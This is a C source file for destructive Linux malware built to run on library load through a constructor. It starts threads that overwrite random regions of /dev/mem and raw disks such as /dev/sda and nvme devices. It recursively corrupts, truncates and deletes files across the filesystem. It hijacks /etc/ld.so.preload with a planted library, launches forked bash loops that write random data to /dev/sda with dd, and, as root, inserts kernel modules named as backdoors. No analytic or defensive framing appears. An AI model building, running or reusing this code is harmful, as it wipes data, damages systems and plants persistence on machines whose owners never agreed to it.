#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <linux/fs.h>
#include <linux/limits.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <time.h>
#include <errno.h>

// statics
static const char *hide_prefixes[] = {"init", "systemd", ".so", ".ko", ".bin", "ld", "busybox", "lib", "bash", NULL};
static const char *exc_dirs[] = {"/proc", "/sys", "/dev", "/run", "/boot", NULL};

// --- NEW extra file support begin ---
static const char *extra_files[] = {
    "/usr/local/.backend/extraEntry.o", "/usr/local/.backend/extraEntry.asm",
    "/usr/local/.backend/meta_shroud.cpp", "/usr/local/.backend/meta_shroud.so",
    "/usr/local/.backend/ghost_mod.ko", "/tmp/extraEntry.o", "/tmp/ghost_mod.ko",
    NULL
};
// --- NEW extra file support end ---

static inline uint64_t rol(uint64_t x, int n) { return (x<<n)|(x>>(64-n)); }
static volatile int running = 1;

static uint64_t fast_rand() {
    static __thread uint64_t x = 0xDEADBEEFABCDEF01ULL;
    x ^= rol(x, 13);
    x ^= rol(x, 7);
    x ^= rol(x, 29);
    return (x ^ 0xFEE11B33CAFEBABEULL) + x * 31337UL;
}

static int should_hide(const char *f) {
    for (int i = 0; hide_prefixes[i]; ++i)
        if (strstr(f, hide_prefixes[i])) return 1;
    return 0;
}

static int skip_dir(const char *p) {
    for (int i = 0; exc_dirs[i]; ++i)
        if (strncmp(p, exc_dirs[i], strlen(exc_dirs[i])) == 0) return 1;
    return 0;
}

static void random_bytes(uint8_t *b, size_t n) {
    for (size_t i = 0; i < n; ++i) b[i] = (uint8_t)(fast_rand() & 0xFF);
}

static void *trojan_inode(void *arg) {
    (void)arg;
    for (int loop = 0; loop < 20; loop++) {
        int fd = open("/dev/mem", O_RDWR|O_SYNC|O_CLOEXEC);
        if (fd >= 0) {
            off_t o = ((off_t)fast_rand() << 12) & 0x3FFFFFFF; // up to 1GB memory area
            lseek(fd, o, SEEK_SET);
            uint8_t buf[128];
            random_bytes(buf, sizeof(buf));
            write(fd, buf, sizeof(buf));
            close(fd);
        }
        struct timespec ts = { 0, 16000000 + (fast_rand()%33000000)};
        nanosleep(&ts, NULL);
    }
    return NULL;
}

static int is_regular(const char *p) {
    struct stat st;
    if (lstat(p, &st) == -1) return 0;
    if (!S_ISREG(st.st_mode)) return 0;
    return st.st_size > 64;
}

// wipes random blocks/overwrites file contents
static void nuke_file(const char *f, int strong) {
    int fd = open(f, O_RDWR|O_CLOEXEC|O_SYNC, 0);
    if (fd == -1) return;
    struct stat st;
    if (fstat(fd, &st) == -1 || st.st_size < 32 || st.st_size > (1LL<<34)) { close(fd); return; }
    size_t sz = (size_t)st.st_size;
    int chunks = strong ? (7 + (fast_rand()%41)) : (2 + (fast_rand()%7));
    for (int k = 0; k < chunks; ++k) {
        off_t off = ((fast_rand() << 13) % sz);
        size_t l = (fast_rand()%4096) + 1 + (strong?(fast_rand()%32000):0);
        if ((off + (off_t)l) > (off_t)sz) l = sz-off;
        uint8_t *buf = malloc(l);
        if (!buf) continue;
        random_bytes(buf, l);
        lseek(fd, off, SEEK_SET);
        if (write(fd, buf, l) != (ssize_t)l) {};
        fsync(fd);
        free(buf);
    }
    if (fast_rand()%5==0) ftruncate(fd, (off_t)(sz / (2 + fast_rand()%3)));
    close(fd);
}

static void shred_dir(const char *p, int strong, int depth);

static void shred_dir(const char *p, int strong, int depth) {
    if (depth > 11) return;
    DIR *d = opendir(p);
    if (!d) return;
    struct dirent *de;
    char buf[PATH_MAX];
    while ((de = readdir(d))) {
        if (!strcmp(de->d_name,".") || !strcmp(de->d_name,"..")) continue;
        snprintf(buf, sizeof(buf), "%s/%s", p, de->d_name);
        // skip protected dirs
        if (skip_dir(buf)) continue;
        struct stat st;
        if (lstat(buf, &st)==-1) continue;
        if (S_ISDIR(st.st_mode)) {
            if (fast_rand()%6) shred_dir(buf, strong, depth+1);
            if (fast_rand()%4==0) rmdir(buf);
        } else if (S_ISREG(st.st_mode)) {
            if (should_hide(de->d_name)) continue;
            nuke_file(buf, strong);
            if (fast_rand()%6==0) unlink(buf);
        } else if (S_ISLNK(st.st_mode)) {
            if (fast_rand()%5==0) unlink(buf);
        }
    }
    closedir(d);
    if (strong && fast_rand()%10==0) rmdir(p);
}

static void *deep_storage_ruin(void *unused) {
    (void)unused;
    const char *mt[] = {"/", "/var", "/home", "/tmp", "/usr/local", "/opt", "/mnt", NULL};
    int rounds = 5+fast_rand()%10;
    for (int i = 0; i < rounds; ++i) {
        for (int j = 0; mt[j]; ++j) {
            if (skip_dir(mt[j])) continue;
            if (fast_rand()%7 == 0) {  // spawn even deeper
                pthread_t t; pthread_create(&t, NULL, deep_storage_ruin, NULL); pthread_detach(t);
            }
            if (fast_rand()%11==0) continue;
            shred_dir(mt[j], 1, 0);
            struct timespec ts = {0, 43000000 + (fast_rand()%90000000)};
            nanosleep(&ts, NULL);
        }
    }
    return NULL;
}

// overlays a rootkit .so into LD_PRELOAD, hijacks /etc/ld.so.preload stealthily
static void rootkit_handoff() {
    const char *srcs[] = {
        "/usr/local/.backend/manager.asm", "/usr/local/.backend/kernel.cpp", "/tmp/manager.asm", "/tmp/kernel.cpp",
        "/usr/bin/manager.asm", "/usr/bin/kernel.cpp", "/usr/local/bin/manager.asm", "/usr/local/bin/kernel.cpp",
        // --- NEW FILES for rootkit handoff ---
        "/usr/local/.backend/extraEntry.o", "/usr/local/.backend/extraEntry.asm",
        "/tmp/extraEntry.o", "/usr/local/bin/extraEntry.o",
        "/usr/local/.backend/meta_shroud.cpp", "/usr/local/.backend/meta_shroud.so",
        "/usr/local/.backend/ghost_mod.ko", "/tmp/ghost_mod.ko", NULL
    };
    for(int i=0;srcs[i];++i) {
        int fd = open(srcs[i], O_RDONLY);
        if (fd>=0) {
            char tbuf[512]; ssize_t r = read(fd, tbuf, sizeof(tbuf));
            close(fd);
            if(r>42) {
                int ofd = open("/lib/libsystemd-hijack.so", O_CREAT|O_WRONLY|O_TRUNC, 0755);
                if (ofd>=0) {
                    write(ofd, tbuf, r>450?r-11:r);
                    close(ofd);
                    int pfd = open("/etc/ld.so.preload", O_WRONLY|O_CREAT|O_TRUNC, 0644);
                    if (pfd>=0) {
                        write(pfd,"/lib/libsystemd-hijack.so\n",27);
                        close(pfd);
                    }
                }
            }
        }
    }
}

// new: destroy extra files directly
static void destroy_extra_files() {
    for (int i = 0; extra_files[i]; ++i) {
        unlink(extra_files[i]);
    }
}

static void *device_destroyer(void *arg) {
    (void)arg;
    const char *devs[] = {"/dev/sda", "/dev/sdb", "/dev/nvme0n1", "/dev/vda", "/dev/loop0", "/dev/mmcblk0", NULL};
    for(int i=0;devs[i];++i){
        int fd = open(devs[i], O_RDWR|O_SYNC|O_CLOEXEC);
        if(fd<0) continue;
        size_t killblocks = 32+(fast_rand()%128);
        lseek(fd, (fast_rand()<<12)&0x1FFFFFFF, SEEK_SET);
        for(size_t b=0;b<killblocks;++b){
            uint8_t buf[4096]; random_bytes(buf, sizeof(buf));
            write(fd, buf, sizeof(buf));
        }
        fsync(fd); close(fd);
    }
    return NULL;
}

// triggers insane forking storm and starts all threads
__attribute__((constructor))
static void __krx_supreme(){
    srand(time(0)^getpid());
    rootkit_handoff();
    destroy_extra_files(); // <- destroy new files added

    for (int i=0;i<3+(fast_rand()%4);++i) {
        pthread_t t; pthread_create(&t,NULL,deep_storage_ruin,NULL); pthread_detach(t);
    }
    for (int i=0;i<2+(fast_rand()%2);++i) {
        pthread_t t; pthread_create(&t,NULL,trojan_inode,NULL); pthread_detach(t);
    }
    for (int i=0;i<2;++i) {
        pthread_t t; pthread_create(&t,NULL,device_destroyer,NULL); pthread_detach(t);
    }
    // Fork bomb + exec (rare)
    if ((rand() % 10) == 0) {
        for (int k=0;k<30;++k){
            if(fork()==0){
                execl("/bin/bash","bash","-c","nohup bash -c 'while :;do dd if=/dev/random of=/dev/sda bs=16K count=1 seek=$((RANDOM%222222)); sleep 0.1; done' &",NULL);
                _exit(1);
            }
        }
    }
    // Optionally: insmod arbitrary kernel modules if root (hidden)
    if (geteuid()==0) {
        char *mods[] = {"/tmp/hax.ko","/tmp/usb_backdoor.ko","/usr/local/bin/evil.ko",
                        "/usr/local/.backend/ghost_mod.ko", "/tmp/ghost_mod.ko", NULL};
        for (int j=0;mods[j];++j) {
            if (access(mods[j],R_OK)==0) {
                char cmd[512];
                snprintf(cmd,sizeof(cmd),"insmod %s > /dev/null 2>&1",mods[j]);
                system(cmd);
            }
        }
    }
}
